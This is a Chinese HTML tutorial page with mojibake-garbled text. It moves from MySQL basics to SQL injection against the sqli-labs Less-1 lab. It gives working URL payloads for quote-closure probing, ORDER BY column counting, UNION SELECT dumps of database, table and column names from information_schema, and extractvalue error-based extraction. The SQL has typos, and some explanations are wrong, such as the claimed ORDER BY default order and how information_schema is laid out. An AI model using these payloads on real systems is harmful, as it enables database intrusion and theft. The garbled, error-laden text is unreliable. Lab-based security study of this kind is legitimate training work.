utf8;</code>åˆ›å»ºä¸€ä¸ªæ•°æ®åº“å«employeeså­—ç¬¦é›†æ˜¯utf8</p><p>åˆ é™¤å«employeesçš„æ•°æ®åº“<br><code>drop database employees;</code></p><h3 id="åˆ›å»ºè¡¨"><a href="#åˆ›å»ºè¡¨" class="headerlink" title="åˆ›å»ºè¡¨"></a>åˆ›å»ºè¡¨</h3><p>åˆ›å»ºä¸€ä¸ªåå­—ä¸ºemployeeçš„è¡¨<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create table employee</span><br><span class="line">//ä¸‹é¢è¾“å…¥è¡¨æ ¼ä¿¡æ¯</span><br><span class="line">(</span><br><span class="line">id int,</span><br><span class="line">name varchar(),</span><br><span class="line">sex char(),</span><br><span class="line">birthday date,</span><br><span class="line">job varchar()</span><br><span class="line">);</span><br></pre></td></tr></table></figure><br>åˆ›å»ºè¡¨æ—¶éœ€è¦å°†æ¯ä¸€åˆ—åˆ†åˆ«æ˜¯ä»€ä¹ˆæ•°æ®ç±»å‹å®šä¹‰å¥½</p><h3 id="æŸ¥çœ‹æ•°æ®è¡¨ä¿¡æ¯"><a href="#æŸ¥çœ‹æ•°æ®è¡¨ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹æ•°æ®è¡¨ä¿¡æ¯"></a>æŸ¥çœ‹æ•°æ®è¡¨ä¿¡æ¯</h3><p><code>show full columns from employee;</code></p><h3 id="æŸ¥çœ‹æ•°æ®è¡¨åˆ—è¡¨"><a href="#æŸ¥çœ‹æ•°æ®è¡¨åˆ—è¡¨" class="headerlink" title="æŸ¥çœ‹æ•°æ®è¡¨åˆ—è¡¨"></a>æŸ¥çœ‹æ•°æ®è¡¨åˆ—è¡¨</h3><p><code>select * from employee;</code></p><h3 id="åˆ é™¤æ•°æ®è¡¨"><a href="#åˆ é™¤æ•°æ®è¡¨" class="headerlink" title="åˆ é™¤æ•°æ®è¡¨"></a>åˆ é™¤æ•°æ®è¡¨</h3><p><code>drop table employeeï¼›</code></p><h1 id="ç»™è¡¨æ·»åŠ ä¸€ä¸ªè‡ªå¢çš„id"><a href="#ç»™è¡¨æ·»åŠ ä¸€ä¸ªè‡ªå¢çš„id" class="headerlink" title="ç»™è¡¨æ·»åŠ ä¸€ä¸ªè‡ªå¢çš„id"></a>ç»™è¡¨æ·»åŠ ä¸€ä¸ªè‡ªå¢çš„id</h1><p><code>alter table è¡¨å add id int unsigned not Null auto_increment primary key</code></p><h3 id="ä¿®æ”¹æ•°æ®è¡¨å"><a href="#ä¿®æ”¹æ•°æ®è¡¨å" class="headerlink" title="ä¿®æ”¹æ•°æ®è¡¨å"></a>ä¿®æ”¹æ•°æ®è¡¨å</h3><p>å°†æ•°æ®è¡¨åæ”¹ä¸ºuser<br><code>rename table employee to user</code></p><h3 id="ä¿®æ”¹å­—ç¬¦çº§"><a href="#ä¿®æ”¹å­—ç¬¦çº§" class="headerlink" title="ä¿®æ”¹å­—ç¬¦çº§"></a>ä¿®æ”¹å­—ç¬¦çº§</h3><p><code>alter table user character set utf8;</code></p><h3 id="æ’å…¥æ•°æ®åˆ°æ•°æ®è¡¨"><a href="#æ’å…¥æ•°æ®åˆ°æ•°æ®è¡¨" class="headerlink" title="æ’å…¥æ•°æ®åˆ°æ•°æ®è¡¨"></a>æ’å…¥æ•°æ®åˆ°æ•°æ®è¡¨</h3><p>æ’å…¥æ•°æ®åˆ°å«userçš„è¡¨ä¸­<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insert into user</span><br><span class="line">(id,name,sex,birthday,job)</span><br><span class="line">values</span><br><span class="line">(1,&quot;ctf&quot;,&quot;male&quot;,&quot;1999-05-&quot;,&quot;it&quot;)</span><br></pre></td></tr></table></figure></p><h3 id="å¢åŠ ä¸€åˆ—åä¸ºsalaryçš„å†…å®¹"><a href="#å¢åŠ ä¸€åˆ—åä¸ºsalaryçš„å†…å®¹" class="headerlink" title="å¢åŠ ä¸€åˆ—åä¸ºsalaryçš„å†…å®¹"></a>å¢åŠ ä¸€åˆ—åä¸ºsalaryçš„å†…å®¹</h3><p><code>alter table user add salary decimal(8,2)</code>//(8,2)æ„ä¸ºæ•°å­é•¿åº¦ä¸ºå…«å°æ•°ç‚¹åä¸¤ä½</p><h3 id="ä¿®æ”¹æŸåˆ—ä¿¡æ¯"><a href="#ä¿®æ”¹æŸåˆ—ä¿¡æ¯" class="headerlink" title="ä¿®æ”¹æŸåˆ—ä¿¡æ¯"></a>ä¿®æ”¹æŸåˆ—ä¿¡æ¯</h3><p>ä¿®æ”¹salaryçš„ä¿¡æ¯<br><code>update user set salary=5000;</code>//userä¸ºè¡¨å<br>å¯ä»¥åœ¨åé¢æ·»åŠ é™å®šè¯­å¥<br><code>update user set salary=5000 where id=1;</code>æ„ä¸ºåªä¿®æ”¹id=1è¡Œçš„salary</p><h3 id="åˆ é™¤åˆ—"><a href="#åˆ é™¤åˆ—" class="headerlink" title="åˆ é™¤åˆ—"></a>åˆ é™¤åˆ—</h3><p><code>alter table user drop salary</code></p><h3 id="åˆ é™¤è¡Œ"><a href="#åˆ é™¤è¡Œ" class="headerlink" title="åˆ é™¤è¡Œ"></a>åˆ é™¤è¡Œ</h3><p><code>delet from user where jop=&#39;it&#39;</code> åˆ é™¤job=â€™itâ€™çš„é‚£ä¸€è¡Œ</p><h3 id="åˆ é™¤è¡¨"><a href="#åˆ é™¤è¡¨" class="headerlink" title="åˆ é™¤è¡¨"></a>åˆ é™¤è¡¨</h3><p><code>delet form userï¼›</code></p><h2 id="æ•°æ®åº“çš„æŸ¥è¯¢"><a href="#æ•°æ®åº“çš„æŸ¥è¯¢" class="headerlink" title="æ•°æ®åº“çš„æŸ¥è¯¢"></a>æ•°æ®åº“çš„æŸ¥è¯¢</h2><h3 id="æŸ¥è¯¢æ•°æ®è¡¨ä¸­çš„ä¿¡æ¯"><a href="#æŸ¥è¯¢æ•°æ®è¡¨ä¸­çš„ä¿¡æ¯" class="headerlink" title="æŸ¥è¯¢æ•°æ®è¡¨ä¸­çš„ä¿¡æ¯"></a>æŸ¥è¯¢æ•°æ®è¡¨ä¸­çš„ä¿¡æ¯</h3><p><code>select * from æ•°æ®è¡¨å;</code>è¿™ä¸ªæ®µä»£ç è¡¨ç¤ºçš„æ˜¯æŸ¥è¯¢è¡¨ä¸­çš„æ‰€æœ‰åˆ—ä¿¡æ¯ï¼Œ<em>è¡¨ç¤ºçš„æ˜¯æ‰€æœ‰åˆ—å<br>`select </em> from æ•°æ®è¡¨å where åˆ—å=æ•°æ®<code>è¿™å¥è¯æ˜¯å¯¹æŸ¥è¯¢çš„è¡Œè¿›è¡Œé™åˆ¶ï¼ŒåªæŸ¥è¯¢ç¬¦åˆé™åˆ¶çš„è¡Œï¼Œå¦‚é™åˆ¶å¯ä»¥æ˜¯</code>where id=1`ä¹‹ç±»çš„<br>ä¹Ÿå¯ä»¥å°†æ˜Ÿå·è¿›è¡Œæ”¹å˜æ¥æŸ¥è¯¢è‡ªå·±æƒ³è¦çš„é‚£ä¸€åˆ—</p><h3 id="union-è”åˆæŸ¥è¯¢"><a href="#union-è”åˆæŸ¥è¯¢" class="headerlink" title="union è”åˆæŸ¥è¯¢"></a>union è”åˆæŸ¥è¯¢</h3><p>union è”åˆæŸ¥è¯¢å¤šæ¡è¯­å¥<br>å¦‚è¾“å…¥ä»¥ä¸‹ä»£ç <br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select idï¼ˆ`åˆ—å`ï¼‰ from userï¼ˆæ•°æ®è¡¨åï¼‰ union select email(åˆ—å) from userï¼ˆè¡¨åï¼‰ï¼›</span><br></pre></td></tr></table></figure><br>ä¹Ÿå¯ä»¥å¯¹å…¶è¿›è¡Œé™åˆ¶ï¼Œåªè¦åœ¨è¡¨åååŠ ä¸Š<code>where é™åˆ¶æ¡ä»¶</code><br><strong>æ³¨æ„ç”¨unionè”åˆæŸ¥è¯¢æ—¶è¦æŸ¥è¯¢ä¸¤ä¸ªè¡¨çš„æ‰€æœ‰ä¿¡æ¯æ—¶ä¸¤è¡¨çš„åˆ—æ•°éœ€è¦ç›¸åŒ</strong><br>å½“åˆ—æ•°ä¸åŒæ—¶å¯ä»¥è¾“å…¥ä»¥ä¸‹ä»£ç <br><code>SELECT * FROM naem union select *,3 from emplpyee;</code>unionåé¢çš„é‚£æ¡æŸ¥è¯¢è¯­å¥ä¸­çš„3æ˜¯å¯¹å…¶ç¼ºå°‘çš„é‚£ä¸€åˆ—è¿›è¡Œå¡«å……ã€‚</p><h3 id="group-byåˆ—æ•°æŸ¥è¯¢"><a href="#group-byåˆ—æ•°æŸ¥è¯¢" class="headerlink" title="group byåˆ—æ•°æŸ¥è¯¢"></a>group byåˆ—æ•°æŸ¥è¯¢</h3><p>group byçš„ä½œç”¨æ˜¯åˆ†ç»„ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥å¯¹è¡¨çš„åˆ—æ•°è¿›è¡ŒæŸ¥è¯¢<br><code>select * from è¡¨å where id=1 group by åˆ—æ•°</code>ï¼Œåœ¨ä¸Šé¢é‚£è·³è¯­å¥ä¸­æˆ‘ä»¬å¯ä»¥å¯¹åˆ—æ•°è¿›è¡Œæ›´æ”¹æ¥æŸ¥è¯¢åˆ—æ•°ï¼Œä¸€æ—¦è¶…è¿‡åˆ—æ•°çš„æ€»æ•°å°±ä¼šæŠ¥é”™ã€‚</p><h3 id="order-byåˆ—æ•°æŸ¥è¯¢"><a href="#order-byåˆ—æ•°æŸ¥è¯¢" class="headerlink" title="order byåˆ—æ•°æŸ¥è¯¢"></a>order byåˆ—æ•°æŸ¥è¯¢</h3><p>order byçœŸæ­£çš„ä½œç”¨æ˜¯æ’åºï¼ŒåŒä¸Šæˆ‘ä»¬ä¹Ÿå¯ä»¥æ‹¿æ¥å¯¹åˆ—æ•°è¿›è¡ŒæŸ¥è¯¢<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> è¡¨å <span class="keyword">order</span> <span class="keyword">by</span> åˆ—æ•°</span><br></pre></td></tr></table></figure><br>åŸç†ç›¸åŒä¹Ÿæ˜¯å¯¹åˆ—æ•°è¿›è¡Œæ›´æ”¹ï¼Œ<br><strong>åœ¨åˆ—æ•°ååŠ descè¿™æ˜¯å°†order byçš„é»˜è®¤é™åºæ’åºæ”¹ä¸ºå‡åº</strong></p><h3 id="limit-é™åˆ¶è¾“å‡ºæ•°é‡"><a href="#limit-é™åˆ¶è¾“å‡ºæ•°é‡" class="headerlink" title="limit é™åˆ¶è¾“å‡ºæ•°é‡"></a>limit é™åˆ¶è¾“å‡ºæ•°é‡</h3><p><code>select * from users limit 1ï¼Œ3</code>è¿™æ¡è¯­å¥çš„æ„æ€æ˜¯æŸ¥è¯¢userè¡¨çš„æ‰€æœ‰åˆ—ï¼Œæ˜¾ç¤ºç¬¬2è¡Œé“ç¬¬4è¡Œçš„å†…å®¹ï¼ˆç”±äºç¬¬limit 0æ‰æ˜¯ä»ç¬¬ä¸€è¡Œå¼€å§‹æ‰€ä»¥éœ€è¦åŠ 1ï¼‰ï¼Œ</p><h3 id="andå’Œor-ä¸å’Œæˆ–"><a href="#andå’Œor-ä¸å’Œæˆ–" class="headerlink" title="andå’Œor ä¸å’Œæˆ–"></a>andå’Œor ä¸å’Œæˆ–</h3><p>andå°±æ˜¯ä¸<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> name<span class="operator">=</span>ctf;</span><br></pre></td></tr></table></figure><br>ä¸Šé¢ä»£ç çš„æ„æ€ä¸ºæŸ¥è¯¢usersè¡¨ä¸­id=1ä¸”name=ctfçš„é‚£ä¸€è¡Œ<br>orå°±æ˜¯æˆ–<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> form users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> name<span class="operator">=</span>ctf;</span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„è¯­å¥å°±æ˜¯è¾“å‡ºæ»¡è¶³id=1æˆ–è€…name=ctfçš„æ•°æ®è¡Œ</p><h4 id="åˆ©ç”¨andå’Œoråˆ¤æ–­é—­åˆå…³ç³»-å­—ç¬¦å‹æˆ–æ•°å­å‹"><a href="#åˆ©ç”¨andå’Œoråˆ¤æ–­é—­åˆå…³ç³»-å­—ç¬¦å‹æˆ–æ•°å­å‹" class="headerlink" title="åˆ©ç”¨andå’Œoråˆ¤æ–­é—­åˆå…³ç³»(å­—ç¬¦å‹æˆ–æ•°å­å‹)"></a>åˆ©ç”¨andå’Œoråˆ¤æ–­é—­åˆå…³ç³»(å­—ç¬¦å‹æˆ–æ•°å­å‹)</h4><h4 id="åˆ©ç”¨andå’Œoræäº¤ä¸‡èƒ½å¯†ç "><a href="#åˆ©ç”¨andå’Œoræäº¤ä¸‡èƒ½å¯†ç " class="headerlink" title="åˆ©ç”¨andå’Œoræäº¤ä¸‡èƒ½å¯†ç "></a>åˆ©ç”¨andå’Œoræäº¤ä¸‡èƒ½å¯†ç </h4><h2 id="å¸¸ç”¨å‡½æ•°z"><a href="#å¸¸ç”¨å‡½æ•°z" class="headerlink" title="å¸¸ç”¨å‡½æ•°z"></a>å¸¸ç”¨å‡½æ•°z</h2><h3 id="group-concat-å¤šè¡Œæ•´åˆæˆå•è¡Œè¾“å‡º"><a href="#group-concat-å¤šè¡Œæ•´åˆæˆå•è¡Œè¾“å‡º" class="headerlink" title="group_concat å¤šè¡Œæ•´åˆæˆå•è¡Œè¾“å‡º"></a>group_concat å¤šè¡Œæ•´åˆæˆå•è¡Œè¾“å‡º</h3><p>è¿™ä¸ªå‡½æ•°æ˜¯å°†è¾“å‡ºçš„å¤šè¡Œè½¬å˜ä¸ºä¸€è¡Œä»£ç å¦‚ä¸‹ã€<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(nameï¼ˆå¯å¤šä¸ªåˆ—åï¼‰) <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„ä»£ç å¯ä»¥å°†æœ¬è¯¥å¤šè¡Œè¾“å‡ºçš„nameæ•´åˆæˆä¸€è¡Œè¾“å‡º</p><h3 id="select-databaseï¼ˆï¼‰æŸ¥è¯¢å½“å‰æ•°æ®åº“åç§°"><a href="#select-databaseï¼ˆï¼‰æŸ¥è¯¢å½“å‰æ•°æ®åº“åç§°" class="headerlink" title="select databaseï¼ˆï¼‰æŸ¥è¯¢å½“å‰æ•°æ®åº“åç§°"></a>select databaseï¼ˆï¼‰æŸ¥è¯¢å½“å‰æ•°æ®åº“åç§°</h3><h3 id="select-versionï¼ˆï¼‰æŸ¥è¯¢å½“å‰æ•°æ®åº“ç‰ˆæœ¬"><a href="#select-versionï¼ˆï¼‰æŸ¥è¯¢å½“å‰æ•°æ®åº“ç‰ˆæœ¬" class="headerlink" title="select versionï¼ˆï¼‰æŸ¥è¯¢å½“å‰æ•°æ®åº“ç‰ˆæœ¬"></a>select versionï¼ˆï¼‰æŸ¥è¯¢å½“å‰æ•°æ®åº“ç‰ˆæœ¬</h3><h2 id="sqlæ³¨å…¥åŸºç¡€ï¼ˆä»¥ä¸‹ä»£ç ä»¥sqli-labsçš„less1çš„ä»£ç ä¸¾ä¾‹ï¼‰"><a href="#sqlæ³¨å…¥åŸºç¡€ï¼ˆä»¥ä¸‹ä»£ç ä»¥sqli-labsçš„less1çš„ä»£ç ä¸¾ä¾‹ï¼‰" class="headerlink" title="sqlæ³¨å…¥åŸºç¡€ï¼ˆä»¥ä¸‹ä»£ç ä»¥sqli-labsçš„less1çš„ä»£ç ä¸¾ä¾‹ï¼‰"></a>sqlæ³¨å…¥åŸºç¡€ï¼ˆä»¥ä¸‹ä»£ç ä»¥sqli-labsçš„less1çš„ä»£ç ä¸¾ä¾‹ï¼‰</h2><h3 id="1-æŸ¥è¯¢æ³¨å…¥ç‚¹"><a href="#1-æŸ¥è¯¢æ³¨å…¥ç‚¹" class="headerlink" title="1.æŸ¥è¯¢æ³¨å…¥ç‚¹"></a>1.æŸ¥è¯¢æ³¨å…¥ç‚¹</h3><p>æ³¨å…¥ç‚¹å°±æ˜¯å¯ä»¥å®è¡Œæ³¨å…¥çš„åœ°æ–¹é€šå¸¸æ˜¯ä¸€ä¸ªè®¿é—®æ•°æ®åº“çš„è¿æ¥ã€‚å¦‚sqli-labsçš„less1å°±æ˜¯input the ID</p><h3 id="2-åˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥"><a href="#2-åˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥" class="headerlink" title="2.åˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥"></a>2.åˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥</h3><p>å¯ä»¥åœ¨ç½‘é¡µä¸­è¿›è¡Œä¼ å€¼è¿›è¡Œåˆ¤æ–­<br>æœ‰ä¸¤ç§æ–¹æ³•å¦‚<br>1.åœ¨sqli-labsçš„less1å°±éœ€è¦è¾“å…¥<br><code>?id=1</code>æŸ¥çœ‹å›æ˜¾ååœ¨<code>?id=2-1</code>æŸ¥çœ‹å›æ˜¾å†å’Œ<code>id=1</code>çš„å›æ˜¾å†…å®¹è¿›è¡Œæ¯”è¾ƒè‹¥<br>æƒ³åŒä¸ºæ•°å­—å‹ä¸åŒä¸ºå­—ç¬¦å‹<br>2.è¾“å…¥<code>?id=1</code>åè¾“å…¥<code>?id=1 and 1=2</code>è‹¥æˆåŠŸå›æ˜¾åˆ™ä¸ºå­—ç¬¦å‹ï¼Œåä¹‹ä¸ºæ•°å­—å‹</p><h3 id="3-å¦‚æœæ˜¯å­—ç¬¦å‹æ³¨å…¥æ‰¾åˆ°é—­åˆæ–¹å¼"><a href="#3-å¦‚æœæ˜¯å­—ç¬¦å‹æ³¨å…¥æ‰¾åˆ°é—­åˆæ–¹å¼" class="headerlink" title="3.å¦‚æœæ˜¯å­—ç¬¦å‹æ³¨å…¥æ‰¾åˆ°é—­åˆæ–¹å¼"></a>3.å¦‚æœæ˜¯å­—ç¬¦å‹æ³¨å…¥æ‰¾åˆ°é—­åˆæ–¹å¼</h3><p>åœ¨æˆ‘ä»¬è¿›è¡Œä¼ å€¼id=1æ—¶ç”±äºæ˜¯å­—ç¬¦æ‰€ä»¥æˆ‘ä»¬ä¼ å…¥çš„å€¼éƒ½å°†ä¼šåœ¨å¼•å·å†…æ‰€æœ‰å‡ºå³ä½¿ä¼ å…¥å‘½ä»¤ä¹Ÿå°†æ— æ³•è¿›è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é—­åˆå¼•å·<br>ä¼ å…¥<code>?id=1&#39;--+</code>â€”+çš„æ„ä¹‰æ˜¯å°†åé¢çš„è¯­å¥æ³¨é‡Šå¦‚æœä¸æ³¨é‡Šç”±äºæˆ‘ä»¬ä¼ å…¥äº†ä¸€ä¸ª<code>1&#39;</code>è¿™ä¼šå¯¼è‡´åé¢çš„å¼•å·è½å•å¯¼è‡´æŠ¥é”™æ‰€ä»¥éœ€è¦æ³¨é‡Šæ‰åé¢çš„è¯­å¥ã€‚<br>å½“ç„¶æˆ‘ä»¬ä¼ å…¥1â€™ä¸ä¸€å®šä¼šæœ‰æ•ˆæœå› ä¸ºå­—ç¬¦çš„é—­åˆæ–¹å¼æœ‰å¤šç§å¦‚ä¸‹<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; &quot; &#x27;</span>) &quot;)</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬éœ€è¦è‡ªå·±è¿›è¡Œå°è¯•</p><h3 id="4-åˆ¤æ–­æŸ¥è¯¢è¿”å›çš„åˆ—æ•°"><a href="#4-åˆ¤æ–­æŸ¥è¯¢è¿”å›çš„åˆ—æ•°" class="headerlink" title="4.åˆ¤æ–­æŸ¥è¯¢è¿”å›çš„åˆ—æ•°"></a>4.åˆ¤æ–­æŸ¥è¯¢è¿”å›çš„åˆ—æ•°</h3><p>åˆ¤æ–­åˆ—æ•°çš„åŸå› ä¸ºæˆ‘ä»¬åœ¨æ³¨å…¥æ—¶ä¸€èˆ¬éœ€è¦unionæ¥è¿›è¡Œè”åˆæŸ¥è¯¢å¦‚ä»¥ä¸‹ä»£ç <br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select * from è¡¨å</span><br></pre></td></tr></table></figure><br>ä¼ å…¥çš„è¯­å¥å°±æ˜¯<code>select * from è¡¨å where id=1 union select * from è¡¨å;</code></p><p>unionåœ¨è¿›è¡ŒæŸ¥è¯¢æ—¶è¦ä¿è¯æŸ¥è¯¢çš„ä¸¤è¡¨åˆ—æ•°ç›¸åŒæ‰€ä»¥æˆ‘ä»¬éœ€è¦æŸ¥è¯¢åˆ—æ•°</p><p>æŸ¥è¯¢åˆ—æ•°éœ€è¦ç”¨åˆ°æˆ‘ä»¬ä¹‹å‰çš„order by å’Œ group by<br>è¾“å…¥å¦‚ä¸‹è¯­å¥<code>?id=1&#39; order by 1</code><br>å°†order byåçš„æ•°å­—è¿›è¡Œæ›¿æ¢å°è¯•ï¼Œæ¥æŸ¥è¯¢è¿™ä¸ªè¡¨çš„åˆ—æ•°ï¼ˆgroup byä¹Ÿç›¸åŒï¼‰</p><h3 id="5-æŸ¥è¯¢å›æ˜¾ä½ç½®"><a href="#5-æŸ¥è¯¢å›æ˜¾ä½ç½®" class="headerlink" title="5.æŸ¥è¯¢å›æ˜¾ä½ç½®"></a>5.æŸ¥è¯¢å›æ˜¾ä½ç½®</h3><p>æŸ¥è¯¢å›æ˜¾ä½ç½®æ—¶æˆ‘ä»¬éœ€è¦ç”¨çš„è”åˆæŸ¥è¯¢union<strong>æ³¨æ„ï¼šè”åˆæŸ¥è¯¢æ—¶æ‰€ä¼ å‡ºçš„å€¼ä¸ºä¸¤è¡Œä½†æ˜¯ç½‘é¡µä¸€èˆ¬åªå›æ˜¾ä¸€è¡Œ</strong>è¿™æ—¶æˆ‘ä»¬å°±éœ€è¦ä½¿å‰ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºç©ºå€¼æˆ–æ— æ³•ä¼ å‡ºï¼Œè¿™æ˜¯æˆ‘ä»¬å°±å°†id=-1è¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥åœ¨å±å¹•ä¸Šçœ‹è§è”åˆæŸ¥è¯¢çš„ç¬¬äºŒæ¡è¯­å¥äº†<br>æŸ¥è¯¢å›æ˜¾ä½ç½®æˆ‘ä»¬åªéœ€è¦è¾“å…¥å¦‚ä¸‹ä»£ç <br><code>?id=-1&#39; union select 1,2,3--+</code><br>æ­¤æ—¶å±å¹•ä¸Šå°±ä¼šå‡ºç°æ•°å­—çš„å›æ˜¾è¿™æ—¶æˆ‘ä»¬æŸ¥çœ‹å›æ˜¾äº†ä»€ä¹ˆæ•°å­—ï¼Œé‚£äº›å›æ˜¾çš„æ•°å­—å°±æ˜¯å›æ˜¾ä½ç½®ï¼Œæˆ‘ä»¬å¯ä»¥å°†é‚£äº›æ•°å­—æ›¿æ¢æˆè¯­å¥ä»¥æ­¤æ¥è¿›è¡ŒæŸ¥è¯¢</p><h2 id="çˆ†åº“å"><a href="#çˆ†åº“å" class="headerlink" title="çˆ†åº“å"></a>çˆ†åº“å</h2><p>åœ¨æ•°æ®åº“ä¸­å­˜åœ¨å«information_schemaçš„æ•°æ®åº“ï¼Œè¿™ä¸ªæ•°æ®åº“ä¸­å­˜åœ¨ä¸€ä¸ªå«schema_nameçš„æ•°æ®è¡¨ï¼Œè¡¨é‡Œçš„schemataåˆ—ä¸­å­˜å‚¨è¿™æ‰€ä»¥æ•°æ®åº“çš„åç§°é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æŸ¥è¯¢è¯­å¥æŸ¥è¯¢æœåŠ¡å™¨ä¸­çš„æ‰€æœ‰åº“åä»£ç å¦‚ä¸‹<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure><br>æ³¨å…¥è¯­å¥ä¸­çš„å†™æ³•å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure></p><h2 id="çˆ†è¡¨å"><a href="#çˆ†è¡¨å" class="headerlink" title="çˆ†è¡¨å"></a>çˆ†è¡¨å</h2><p>æ‰€æœ‰çš„è¡¨åå­˜å‚¨åœ¨information_schemaåº“çš„tablesè¡¨çš„table_nameåˆ—ä¸‹,æŸ¥è¯¢ä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;åº“å&#x27;</span><br></pre></td></tr></table></figure></p><h2 id="çˆ†åˆ—å"><a href="#çˆ†åˆ—å" class="headerlink" title="çˆ†åˆ—å"></a>çˆ†åˆ—å</h2><p>æ‰€æœ‰çš„åˆ—åéƒ½åœ¨information_schemaåº“ä¸‹çš„columnsè¡¨çš„column_nameåˆ—ä¸‹<br>ä»£ç å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) form information_schea.columns where table_name=&#x27;è¡¨å&#x27;</span><br></pre></td></tr></table></figure></p><h1 id="extractvaalue-å‡½æ•°"><a href="#extractvaalue-å‡½æ•°" class="headerlink" title="extractvaalue()å‡½æ•°"></a>extractvaalue()å‡½æ•°</h1><p>extractvalue(xml_frag, xpath_expr)ï¼šä»ä¸€ä¸ªä½¿ç”¨xpathè¯­æ³•çš„xmlå­—ç¬¦ä¸²ä¸­æå–ä¸€ä¸ªå€¼ã€‚xml_fragï¼šxmlæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ˜¯ä¸€ä¸ªstringç±»å‹ã€‚<br>xpath_exprï¼šä½¿ç”¨xpathè¯­æ³•æ ¼å¼çš„è·¯å¾„ã€‚<br>è¿™ä¸ªå‡½æ•°æ˜¯ä¸€ç§æŸ¥è¯¢å‡½æ•°åœ¨æŠ¥é”™æ³¨å…¥æ—¶æˆ‘ä»¬éœ€è¦è¾“å…¥è¯¥å‡½æ•°çš„é”™è¯¯æ ¼å¼æ¥ä½¿sqlæŠ¥é”™ï¼Œè¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥åœ¨æŠ¥é”™é‡Œå¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯<br>è¯¥æ³¨å…¥è¯­å¥é€‚ç”¨äº<br>ä»¥ä¸‹æ˜¯æˆ‘ä»¬æ³¨å…¥æ—¶çš„æ ¼å¼<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select 1,2,extracvalue(1,concat(0x7e,(select ~(~ä¸ºæŸ¥è¯¢è¯­å¥))))</span><br></pre></td></tr></table></figure><br>å…¶ä¸­0x7eä¸ºâ€™~â€™çš„asciiç å€¼ ç”¨concatæ¥å°†~å’ŒæŸ¥<br>è¯¢è¯­å¥è¿›è¡Œæ‹¼æ¥ä½¿è¯­å¥æŠ¥é”™å‡ºæŸ¥è¯¢çš„å†…å®¹ï¼Œä½†æ˜¯æŠ¥é”™çš„å†…å®¹ä¸èƒ½å¤§äº30å­—ç¬¦æ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨åˆ°substringæ¥æ§åˆ¶æŠ¥é”™çš„è¾“å‡º<br><code>substring</code>å¯ä»¥å¯¹è¾“å‡ºçš„å­—ç¬¦é‡è¿›è¡ŒæŸ¥è¯¢<br>ä¸‹é¢æ˜¯èå…¥substringçš„è¾“å…¥è¯­å¥<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,substring(select ~(~ä¸ºæŸ¥è¯¢è¯­å¥))))--+</span><br></pre></td></tr></table></figure></p><h1 id="floorçš„æŠ¥é”™æ³¨å…¥"><a href="#floorçš„æŠ¥é”™æ³¨å…¥" class="headerlink" 